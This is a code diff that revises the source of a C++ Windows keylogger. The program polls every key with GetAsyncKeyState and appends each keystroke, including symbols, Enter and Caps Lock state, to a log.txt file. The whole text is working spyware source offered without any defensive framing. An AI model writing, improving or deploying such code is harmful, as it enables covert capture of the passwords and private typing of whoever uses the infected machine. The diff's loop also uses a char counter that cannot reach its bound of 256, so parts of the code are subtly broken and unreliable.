@@ -3,7 +3,7 @@
 #include <iostream>
 
 using namespace std;
-
+int i = 0;
 int save(int key);
 
 int main()
@@ -11,7 +11,7 @@ int main()
 	char input;
 	while (true)
 	{
-		for (input = 8; input <= 127; input++)
+		for (input = 8; input <= 256; input++)
 		{
 			if (GetAsyncKeyState(input) == -32767)
 				save(input);
@@ -22,130 +22,186 @@ int main()
 
 int save(int key)
 {
-	int i = 0;
+
 	ofstream fout;
 	fout.open("log.txt", ios::out | ios::app);
 
-	if (key == 8)
-		fout << "[backspace]";
-
-	else if (key == 9)
-		fout << "[horizontal tab]";
-
-	else if (key == 32)
-		fout << "[space]"
-			 << " ";
-	else if (key == 13)
-		fout << endl
-			 << "[enter]" << endl;
-	else if (key == 20)
-	{
-		if (i % 2 == 0)
-			fout << "[capsON]";
-		else
-			fout << "capsOFF";
-		i++;
-	}
-
-	else if (GetAsyncKeyState(VK_SHIFT))
+	if (GetAsyncKeyState(VK_SHIFT)) //when shift is pressed
 	{
 		switch (key)
 		{
-		case 33:
-			fout << "!" break;
 
-		case 34:
-			fout << "\"";
+		case 48:
+			fout << ")";
 			break;
-			// It can vary by keyboard.
-		case 35:
+
+		case 49:
+			fout << "!";
+			break;
+
+		case 50:
+			fout << "@";
+			break;
+
+		case 51:
 			fout << "#";
 			break;
-			// It can vary by keyboard.
-		case 36:
+
+		case 52:
 			fout << "$";
 			break;
-			// It can vary by keyboard.
-		case 37:
+
+		case 53:
 			fout << "%";
 			break;
-			// It can vary by keyboard.
-		case 94:
+
+		case 54:
 			fout << "^";
 			break;
-			// It can vary by keyboard.
-		case 38:
+
+		case 55:
 			fout << "&";
 			break;
-			// It can vary by keyboard.
-		case 42:
+
+		case 56:
 			fout << "*";
 			break;
-			// It can vary by keyboard.
-		case 40:
+
+		case 57:
 			fout << "(";
 			break;
-			// It can vary by keyboard.
-		case 41:
+
+		case 186:
 			fout << ":";
 			break;
-			// It can vary by keyboard.
-		case 43:
+
+		case 187:
 			fout << "+";
 			break;
-			// It can vary by keyboard.
-		case 60:
+
+		case 188:
 			fout << "<";
 			break;
-			// It can vary by keyboard.
-		case 95:
+
+		case 189:
 			fout << "_";
 			break;
 
-		case 62:
+		case 190:
 			fout << ">";
 			break;
 
-		case 63:
-			fout << "?";
+		case 191:
+			fout << "\?";
 			break;
-			// It can vary by keyboard.
-		case 126:
+
+		case 192:
 			fout << "~";
 			break;
-			// It can vary by keyboard.
-		case 123:
+
+		case 219:
 			fout << "{";
 			break;
-			// It can vary by keyboard.
-		case 124:
+
+		case 220:
 			fout << "|";
 			break;
-			// It can vary by keyboard.
-		case 125:
+
+		case 221:
 			fout << "}";
 			break;
-			// It can vary by keyboard.
 
-		default:
+		case 222:
+			fout << "\"";
 			break;
 		}
 	}
-        else if(key>=48&&key<=57)
-		fout<<(char)key;
-	
+
 	else
+	{switch (key)
 	{
-		if (GetAsyncKeyState(VK_CAPITAL))
-			fout << (char)key;
+	case 8:
+		fout << "[backspace]";
+		break;
+
+	case 9:
+		fout << "[horizontal tab]";
+		break;
+	case 32:
+		fout << "[space]"<< " ";
+		break;
+	case 13:
+		fout << endl<< "[enter]" << endl;
+		break;
+	case 20: //toggle
+
+		if (i % 2 == 0)
+			fout << "[capsON]";
 		else
+			fout << "[capsOFF]";
+		i++;
+		break;
+
+	case 186:
+		fout << ";";
+		break;
+
+	case 187:
+		fout << "=";
+		break;
+
+	case 188:
+		fout << ",";
+		break;
+
+	case 189:
+		fout << "-";
+		break;
+
+	case 190:
+		fout << ".";
+		break;
+
+	case 191:
+		fout << "/";
+		break;
+
+	case 192:
+		fout << "`";
+		break;
+
+	case 219:
+		fout << "[";
+		break;
+
+	case 220:
+		fout << "\\";
+		break;
+
+	case 221:
+		fout << "]";
+		break;
+
+	case 222:
+		fout << "\'";
+		break;
+
+	default:
+		if (key >= 48 && key <= 57) //numbers
+			fout<< (char)key;
+
+		else //alphabets
 		{
+
 			if (i % 2 == 0)
 				fout << (char)(key + 32);
 			else
 				fout << (char)key;
 		}
+		break;
 	}
+	}
+	
 	fout.close();
 	return 0;
 }
